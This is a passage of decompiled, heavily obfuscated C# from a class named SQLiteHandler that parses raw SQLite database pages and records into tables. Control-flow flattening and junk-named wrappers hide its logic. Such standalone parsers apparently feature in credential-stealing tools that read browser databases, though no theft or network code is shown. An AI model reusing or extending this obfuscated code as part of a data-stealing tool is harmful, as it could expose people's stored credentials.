					master_table_entries[num4 + num5].row_id = CVL(dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num6), pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num11), new decimal(num6), pJoaVHxY2BrIpClas5J.kNaxBtIDcG), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), 1m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), num10);
					num2 = 60;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 75:
					ReadMasterTable(cbDw8RxUyskuHYZv5kF.IrTxr5idK(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(ConvertToInteger(num9, 4)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), new decimal(page_size), pJoaVHxY2BrIpClas5J.EuGxwrqv5W), cbDw8RxUyskuHYZv5kF.BJKxudEbSe));
					num2 = 53;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 35:
					num10 = GVL(num11);
					num2 = 7;
					continue;
				case 76:
					num6 += Offset;
					num = 81;
					break;
				case 45:
					if (db_bytes[(uint)Offset] != 13)
					{
						if (db_bytes[(uint)Offset] != 5)
						{
							return;
						}
						num2 = 73;
						continue;
					}
					num = 44;
					break;
				case 29:
					num4 = 0;
					num2 = 37;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 46:
					if (!IsOdd(array[num7]))
					{
						num2 = 51;
						continue;
					}
					goto case 2;
				case 78:
					num4 = master_table_entries.Length;
					num2 = 12;
					continue;
				case 33:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(encoding), 1m, D7od3ix85e95ZRovJXE.F29xlMZGHq) != 0)
					{
						num2 = 47;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
						break;
					}
					goto case 23;
				case 56:
					if (D7od3ix85e95ZRovJXE.IrTxr5idK(new decimal(encoding), 2m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num2 = 36;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
						break;
					}
					goto case 59;
				case 21:
					num8 = 0;
					num2 = 19;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						num2 = 63;
					}
					continue;
				case 51:
				case 66:
					array[num7] = (long)ExIotwbl579mlAbNjfT((double)(array[num7] - 12) / 2.0, F8uQ4cxPXoMb3O4YCmO.j68xjGj3h1);
					num = 26;
					break;
				case 36:
					master_table_entries[num4 + num5].item_type = (string)eYy7jFbTFrUwy7adJeD(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.WIcxbkC0Bn), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[0], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 50;
					continue;
				case 44:
					num3 = IOHgf6x0ftNhqwwtsmQ.IrTxr5idK(oyoItnb8Cx91aw3oy3V(new decimal(ConvertToInteger(ynfu4Xx2a098iYIc2kQ.IrTxr5idK(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(Offset), 3m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 2)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), IOHgf6x0ftNhqwwtsmQ.p3txZPXrbV);
					num2 = 29;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 65:
					master_table_entries[num4 + num5].item_name = (string)eYy7jFbTFrUwy7adJeD(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.Y1HxNmjSpY), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[0]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[1], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 28;
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool ReadTable(string TableName)
	{
		int num = 23;
		string[] array = default(string[]);
		int num3 = default(int);
		int num5 = default(int);
		int num8 = default(int);
		int num4 = default(int);
		int num7 = default(int);
		int num6 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 3:
				case 6:
					array[num3] = bPX82QxIjeLx2NiDrxP.IrTxr5idK(array[num3], new char[0], bPX82QxIjeLx2NiDrxP.lCNxSc13aK);
					num2 = 1;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 16:
					num3++;
					num2 = 7;
					continue;
				case 7:
				case 14:
					if (num3 <= num5)
					{
						num2 = 3;
						continue;
					}
					goto case 10;
				case 8:
				case 21:
					if (num8 <= num4)
					{
						num2 = 5;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
						break;
					}
					goto default;
				default:
					if (num7 == -1)
					{
						num2 = 20;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
					}
					else
					{
						array = (string[])YBmNhqb2qa4s56yWHX7(rcdqvabWXdujfoY2Tf2(master_table_entries[num7].sql_statement, SkAFZqbXhxNaQ388ACd(master_table_entries[num7].sql_statement, QR0eAdbOpPv7iXihK01(346), AsQwq3xgUvOgJMthJeb.o3AxCr2GM5) + 1, iGlsr8xeNsUMGcJcNht.ysCxh4TjK2), new char[1] { ',' }, lTQusXWp5SOS5YeInf.wwAgoDc6l);
						num = 18;
					}
					break;
				case 13:
					array[num3] = (string)uxC4xdbIuIaLeClyUcH(array[num3], 0, num6, HnVWW5xmmY0OqpTe9GV.Im7xXZlZFN);
					num2 = 15;
					continue;
				case 5:
				case 24:
					if (AsQwq3xgUvOgJMthJeb.IrTxr5idK(K27ejBbpvKGrVPHYmG5(master_table_entries[num8].item_name, JB4J6pqWfLbCbJXTau.XBZxERwu9B), (string)K27ejBbpvKGrVPHYmG5(TableName, JB4J6pqWfLbCbJXTau.XBZxERwu9B), AsQwq3xgUvOgJMthJeb.DDLxGNbNT5) != 0)
					{
						num2 = 2;
						if (yFobEtbomKkYXt6dhK5() != null)
						{
							num2 = 1;
						}
						continue;
					}
					goto case 27;
				case 1:
					num6 = SkAFZqbXhxNaQ388ACd(array[num3], QR0eAdbOpPv7iXihK01(352), AsQwq3xgUvOgJMthJeb.o3AxCr2GM5);
					num2 = 9;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 10:
				case 12:
					return ReadTableFromOffset((ulong)((master_table_entries[num7].root_num - 1) * page_size));
				case 27:
					num7 = num8;
					num2 = 17;
					continue;
				case 2:
				case 19:
					num8++;
					num2 = 21;
					continue;
				case 4:
					num8 = 0;
					num = 8;
					break;
				case 23:
					num7 = -1;
					num2 = 22;
					continue;
				case 9:
					if (num6 > 0)
					{
						num2 = 13;
						if (yFobEtbomKkYXt6dhK5() == null)
						{
							continue;
						}
						break;
					}
					goto case 15;
				case 18:
					num5 = array.Length - 1;
					num2 = 25;
					continue;
				case 15:
					if (SkAFZqbXhxNaQ388ACd(array[num3], QR0eAdbOpPv7iXihK01(358), AsQwq3xgUvOgJMthJeb.o3AxCr2GM5) == 0)
					{
						num2 = 12;
						continue;
					}
					goto case 11;
				case 25:
					num3 = 0;
					num2 = 14;
					continue;
				case 20:
					return false;
				case 11:
					field_names = (string[])eIcUWabUpMfqxVTuxeb(field_names, new string[num3 + 1], pCGlJFxrX5h4bahtbTH.PPpxvDa7Te);
					num2 = 26;
					continue;
				case 22:
					num4 = master_table_entries.Length - 1;
					num2 = 4;
					continue;
				case 26:
					field_names[num3] = array[num3];
					num2 = 16;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private bool ReadTableFromOffset(ulong Offset)
	{
		int num = 37;
		record_header_field[] array = default(record_header_field[]);
		int num7 = default(int);
		int num17 = default(int);
		int num9 = default(int);
		int num3 = default(int);
		int num14 = default(int);
		ulong num5 = default(ulong);
		long num12 = default(long);
		int num13 = default(int);
		int num4 = default(int);
		ushort num18 = default(ushort);
		int num15 = default(int);
		int num6 = default(int);
		long num11 = default(long);
		int num10 = default(int);
		int num8 = default(int);
		int num16 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 39:
					if (db_bytes[(uint)Offset] == 5)
					{
						num2 = 37;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							num2 = 72;
						}
						continue;
					}
					goto case 29;
				case 25:
					ReadTableFromOffset(oagAaDbkPBT1A4YW0Et(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(ConvertToInteger(ynfu4Xx2a098iYIc2kQ.IrTxr5idK(oyoItnb8Cx91aw3oy3V(new decimal(Offset), 8m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 4)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), new decimal(page_size), pJoaVHxY2BrIpClas5J.EuGxwrqv5W), cbDw8RxUyskuHYZv5kF.BJKxudEbSe));
					num2 = 29;
					continue;
				case 3:
					array = (record_header_field[])eIcUWabUpMfqxVTuxeb(array, new record_header_field[num7 + 1], pCGlJFxrX5h4bahtbTH.PPpxvDa7Te);
					num2 = 60;
					continue;
				case 36:
					num17 = dR7tgcbjSoo1sThVrXZ(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(ConvertToInteger(dR7tgcbjSoo1sThVrXZ(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(Offset), 3m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 2)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP);
					num = 13;
					break;
				case 5:
					table_entries[num9 + num3].content[num14] = (string)eYy7jFbTFrUwy7adJeD(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.Y1HxNmjSpY), db_bytes, dR7tgcbjSoo1sThVrXZ(pJoaVHxY2BrIpClas5J.IrTxr5idK(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num5), new decimal(num12), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num13), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[num14].size, EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 62;
					continue;
				case 22:
				case 76:
					num4 = num17;
					num2 = 24;
					continue;
				case 70:
					table_entries[num9 + num3].content[num14] = (string)eYy7jFbTFrUwy7adJeD(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.WIcxbkC0Bn), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num5), new decimal(num12), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num13), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[num14].size, EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 31;
					continue;
				case 8:
					array = null;
					num2 = 42;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 19:
				case 45:
					num18 = (ushort)ConvertToInteger(dR7tgcbjSoo1sThVrXZ(pJoaVHxY2BrIpClas5J.IrTxr5idK(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(Offset), 12m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num15 * 2), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 2);
					num2 = 1;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 1;
					}
					continue;
				case 37:
					if (db_bytes[(uint)Offset] == 13)
					{
						num2 = 36;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
						break;
					}
					goto case 39;
				case 33:
				case 49:
					table_entries = new table_entry[num17 + 1];
					num2 = 22;
					continue;
				case 66:
					num12 = CVL((int)num5, num6);
					num2 = 20;
					continue;
				case 47:
					num14 = 0;
					num = 27;
					break;
				case 17:
				case 18:
				case 46:
					num11 = num11 + (num10 - num6) + 1;
					num2 = 48;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 9:
				case 21:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(encoding), 3m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num2 = 5;
						continue;
					}
					goto case 31;
				case 16:
					CVL((int)num5, num6);
					num2 = 74;
					continue;
				case 44:
					num7 = 0;
					num2 = 0;
					if (!vEqCHrbfSFZEkZtgXxf())
					{
						num2 = 0;
					}
					continue;
				case 74:
					num10 = GVL(ynfu4Xx2a098iYIc2kQ.IrTxr5idK(pJoaVHxY2BrIpClas5J.IrTxr5idK(oyoItnb8Cx91aw3oy3V(new decimal(num5), pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num6), new decimal(num5), pJoaVHxY2BrIpClas5J.kNaxBtIDcG), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), 1m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP));
					num = 65;
					break;
				case 30:
					if (!IsOdd(array[num14].type))
					{
						num = 28;
						break;
					}
					goto case 73;
				case 73:
					table_entries[num9 + num3].content[num14] = (string)eYy7jFbTFrUwy7adJeD(epSgjwbRDiZUV0MnyRq(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num5), new decimal(num12), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num13), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[num14].size, EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 59;
					continue;
				case 28:
					if (D7od3ix85e95ZRovJXE.IrTxr5idK(new decimal(encoding), 1m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num2 = 68;
						continue;
					}
					goto case 4;
				case 31:
				case 59:
				case 62:
				case 69:
				case 75:
					num13 += (int)array[num14].size;
					num = 2;
					break;
				case 13:
					num9 = 0;
					num2 = 71;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 11:
				case 27:
					if (num14 <= num8)
					{
						num2 = 12;
						continue;
					}
					goto case 55;
				case 35:
				case 64:
					if (num15 <= num16)
					{
						num2 = 45;
						continue;
					}
					goto case 25;
				case 34:
					if (IsOdd(array[num7].type))
					{
						num2 = 38;
						continue;
					}
					goto case 6;
				case 12:
				case 63:
					if (array[num14].type > 9)
					{
						num = 30;
						break;
					}
					goto case 57;
				case 26:
					num6 = GVL((int)num5);
					num2 = 16;
					continue;
				case 32:
					array[num7].type = CVL(num6, num10);
					num2 = 56;
					continue;
				case 1:
					ReadTableFromOffset(oagAaDbkPBT1A4YW0Et(pJoaVHxY2BrIpClas5J.IrTxr5idK(oyoItnb8Cx91aw3oy3V(new decimal(ConvertToInteger((int)(Offset + num18), 4)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), new decimal(page_size), pJoaVHxY2BrIpClas5J.EuGxwrqv5W), cbDw8RxUyskuHYZv5kF.BJKxudEbSe));
					num2 = 43;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 2:
					num14++;
					num2 = 11;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 7;
					}
					continue;
				case 41:
					num5 += Offset;
					num2 = 26;
					continue;
				case 14:
					num10 = num6;
					num2 = 66;
					continue;
				case 40:
					table_entries = (table_entry[])eIcUWabUpMfqxVTuxeb(table_entries, new table_entry[table_entries.Length + num17 + 1], pCGlJFxrX5h4bahtbTH.PPpxvDa7Te);
					num2 = 68;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						num2 = 76;
					}
					continue;
				case 67:
					num5 = oagAaDbkPBT1A4YW0Et(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num5), oyoItnb8Cx91aw3oy3V(new decimal(num10), new decimal(num5), pJoaVHxY2BrIpClas5J.kNaxBtIDcG), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), 1m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), cbDw8RxUyskuHYZv5kF.BJKxudEbSe);
					num2 = 52;
					continue;
				case 4:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(encoding), 2m, D7od3ix85e95ZRovJXE.F29xlMZGHq) != 0)
					{
						num2 = 21;
						if (yFobEtbomKkYXt6dhK5() == null)
						{
							continue;
						}
						break;
					}
					goto case 70;
				case 57:
					table_entries[num9 + num3].content[num14] = (string)KF9RhPbYmS2BtMCEhRD(ConvertToInteger(dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num5), new decimal(num12), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num13), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[num14].size), LphrfQx5x5xOG5Bwt4P.ztMxLThIRH);
					num2 = 69;
					continue;
				case 50:
					num13 = 0;
					num2 = 61;
					continue;
				case 55:
					num3++;
					num2 = 77;
					continue;
				case 60:
					num6 = num10 + 1;
					num2 = 58;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 43:
					num15++;
					num2 = 64;
					continue;
				case 72:
					num16 = UJdlEpbahOe6MVPLvN0(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(ConvertToInteger(dR7tgcbjSoo1sThVrXZ(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(Offset), 3m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 2)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), IOHgf6x0ftNhqwwtsmQ.p3txZPXrbV);
					num2 = 10;
					continue;
				case 48:
					num7++;
					num2 = 7;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 68:
					table_entries[num9 + num3].content[num14] = (string)eYy7jFbTFrUwy7adJeD(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num5), new decimal(num12), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num13), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[num14].size, EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 18;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						num2 = 75;
					}
					continue;
				case 58:
					num10 = GVL(num6);
					num2 = 32;
					continue;
				case 15:
				case 51:
					array[num7].size = SQLDataTypeSize[(int)array[num7].type];
					num2 = 17;
					continue;
				case 53:
					num9 = table_entries.Length;
					num = 40;
					break;
				case 20:
					num11 = tYGMnibQOOLvbbZ3VjY(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num5), new decimal(num6), pJoaVHxY2BrIpClas5J.kNaxBtIDcG), 1m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), s4ckl5xOT2F9OQsZ6RE.khex4YiUbU);
					num2 = 44;
					continue;
				case 42:
					num5 = ConvertToInteger(dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(Offset), 8m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num3 * 2), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 2);
					num2 = 79;
					continue;
				case 78:
					table_entries[num9 + num3].content = new string[array.Length - 1 + 1];
					num2 = 18;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						num2 = 50;
					}
					continue;
				case 79:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(Offset), 100m, D7od3ix85e95ZRovJXE.F29xlMZGHq) != 0)
					{
						num2 = 41;
						if (yFobEtbomKkYXt6dhK5() == null)
						{
							continue;
						}
						break;
					}
					goto case 26;
				case 38:
					array[num7].size = (long)F8uQ4cxPXoMb3O4YCmO.IrTxr5idK((double)(array[num7].type - 13) / 2.0, F8uQ4cxPXoMb3O4YCmO.j68xjGj3h1);
					num2 = 18;
					continue;
				case 10:
					num15 = 0;
					num = 35;
					break;
				case 24:
					num3 = 0;
					num = 23;
					break;
				case 6:
					array[num7].size = (long)ExIotwbl579mlAbNjfT((double)(array[num7].type - 12) / 2.0, F8uQ4cxPXoMb3O4YCmO.j68xjGj3h1);
					num2 = 46;
					if (!vEqCHrbfSFZEkZtgXxf())
					{
						num2 = 34;
					}
					continue;
				default:
					if (num11 >= num12)
					{
						num2 = 78;
						continue;
					}
					goto case 3;
				case 65:
					table_entries[num9 + num3].row_id = CVL(dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num5), oyoItnb8Cx91aw3oy3V(new decimal(num6), new decimal(num5), pJoaVHxY2BrIpClas5J.kNaxBtIDcG), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), 1m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), num10);
					num2 = 67;
					continue;
				case 61:
					num8 = array.Length - 1;
					num2 = 47;
					continue;
				case 52:
					num6 = GVL((int)num5);
					num2 = 14;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 29:
				case 54:
					return true;
				case 71:
					if (table_entries == null)
					{
						num = 33;
						break;
					}
					goto case 53;
				case 56:
					if (array[num7].type <= 9)
					{
						num2 = 51;
						continue;
					}
					goto case 34;
				case 23:
				case 77:
					if (num3 > num4)
					{
						num2 = 54;
						if (yFobEtbomKkYXt6dhK5() == null)
						{
							continue;
						}
						break;
					}
					goto case 8;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void aai2m2bvsPTVJdFA9oD()
	{
		WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void CWyhFSbNEOl6fSofOgq(object P_0, RuntimeFieldHandle P_1, object P_2)
	{
		XoIOgKkSI6jhAYrCFN.IrTxr5idK((Array)P_0, P_1, (XoIOgKkSI6jhAYrCFN)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool vMAL22bq65LRX6rnvXK(object P_0, object P_1)
	{
		return fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK((string)P_0, (fiM4Hw9Fl6DhXSwmaZ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void BXP8Npb9cW0mtedRJg1(int P_0, object P_1, OpenMode P_2, OpenAccess P_3, OpenShare P_4, int P_5, object P_6)
	{
		DtIWNuicSgojV5Jdc4.IrTxr5idK(P_0, (string)P_1, P_2, P_3, P_4, P_5, (DtIWNuicSgojV5Jdc4)P_6);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long NICvSpbcwwpNMefs74E(int P_0, object P_1)
	{
		return le9HJ9F7jJ5n0a4FnF.IrTxr5idK(P_0, (le9HJ9F7jJ5n0a4FnF)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object vC6KcQbhEEeghGcnxnu(int P_0, object P_1)
	{
		return kq7JeXpFcRxmKRKDEy.IrTxr5idK(P_0, (kq7JeXpFcRxmKRKDEy)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object epSgjwbRDiZUV0MnyRq(object P_0)
	{
		return gRnjGrxKdWbynd12Ef3.IrTxr5idK((gRnjGrxKdWbynd12Ef3)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object mXvEI7bAKrd4XyyRRHa(object P_0, object P_1, object P_2)
	{
		return lvfeUdxdotHleo5TGFR.IrTxr5idK(P_0, (string)P_1, (lvfeUdxdotHleo5TGFR)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object eYy7jFbTFrUwy7adJeD(object P_0, object P_1, int P_2, int P_3, object P_4)
	{
		return EpL402xDMFadHMekcdj.IrTxr5idK(P_0, (byte[])P_1, P_2, P_3, (EpL402xDMFadHMekcdj)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object QR0eAdbOpPv7iXihK01(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int SkAFZqbXhxNaQ388ACd(object P_0, object P_1, object P_2)
	{
		return AsQwq3xgUvOgJMthJeb.IrTxr5idK(P_0, (string)P_1, (AsQwq3xgUvOgJMthJeb)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int AJYBHdbVtlSNnFpHQ8B(decimal P_0, decimal P_1, object P_2)
	{
		return D7od3ix85e95ZRovJXE.IrTxr5idK(P_0, P_1, (D7od3ix85e95ZRovJXE)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool vEqCHrbfSFZEkZtgXxf()
	{
		return q8VRdKb3PhVpjY4HSq3 == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static SQLiteHandler yFobEtbomKkYXt6dhK5()
	{
		return q8VRdKb3PhVpjY4HSq3;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long pOBTtxb1TRowlInigCS(object P_0, int P_1, object P_2)
	{
		return hfP5Dgx7pUVx5KZGt5k.IrTxr5idK((byte[])P_0, P_1, (hfP5Dgx7pUVx5KZGt5k)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool mCmfdtbwUdFu2tKJUZe(object P_0, object P_1, object P_2)
	{
		return xaHR5Px3RNdNB4LsQbl.IrTxr5idK((string)P_0, (string)P_1, (xaHR5Px3RNdNB4LsQbl)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object eIcUWabUpMfqxVTuxeb(object P_0, object P_1, object P_2)
	{
		return pCGlJFxrX5h4bahtbTH.IrTxr5idK((Array)P_0, (Array)P_1, (pCGlJFxrX5h4bahtbTH)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object K27ejBbpvKGrVPHYmG5(object P_0, object P_1)
	{
		return JB4J6pqWfLbCbJXTau.IrTxr5idK(P_0, (JB4J6pqWfLbCbJXTau)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static decimal oyoItnb8Cx91aw3oy3V(decimal P_0, decimal P_1, object P_2)
	{
		return pJoaVHxY2BrIpClas5J.IrTxr5idK(P_0, P_1, (pJoaVHxY2BrIpClas5J)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int dR7tgcbjSoo1sThVrXZ(decimal P_0, object P_1)
	{
		return ynfu4Xx2a098iYIc2kQ.IrTxr5idK(P_0, (ynfu4Xx2a098iYIc2kQ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static double ExIotwbl579mlAbNjfT(double P_0, object P_1)
	{
		return F8uQ4cxPXoMb3O4YCmO.IrTxr5idK(P_0, (F8uQ4cxPXoMb3O4YCmO)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static ulong oagAaDbkPBT1A4YW0Et(decimal P_0, object P_1)
	{
		return cbDw8RxUyskuHYZv5kF.IrTxr5idK(P_0, (cbDw8RxUyskuHYZv5kF)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object rcdqvabWXdujfoY2Tf2(object P_0, int P_1, object P_2)
	{
		return iGlsr8xeNsUMGcJcNht.IrTxr5idK(P_0, P_1, (iGlsr8xeNsUMGcJcNht)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object YBmNhqb2qa4s56yWHX7(object P_0, object P_1, object P_2)
	{
		return lTQusXWp5SOS5YeInf.IrTxr5idK(P_0, (char[])P_1, (lTQusXWp5SOS5YeInf)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object uxC4xdbIuIaLeClyUcH(object P_0, int P_1, int P_2, object P_3)
	{
		return HnVWW5xmmY0OqpTe9GV.IrTxr5idK(P_0, P_1, P_2, (HnVWW5xmmY0OqpTe9GV)P_3);
	}

